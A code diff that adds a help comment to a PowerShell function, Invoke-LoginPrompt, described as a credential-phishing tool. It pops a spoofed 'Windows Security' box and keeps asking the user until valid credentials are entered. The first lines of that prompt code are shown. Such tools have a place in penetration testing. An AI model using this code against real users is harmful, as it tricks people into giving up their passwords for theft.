@@ -1,3 +1,14 @@
+<#
+.SYNOPSIS
+Standalone Powershell script that will promp the current user for a valid credentials.
+
+.DESCRIPTION
+This script will pop a Windows Authentication box and ask the user for credentials. It will then validate those credentials and continue to ask until proper credentials are supplied.
+
+.LINK
+http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
+#>
+
 function Invoke-LoginPrompt{
     $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
     $username = "$env:username"
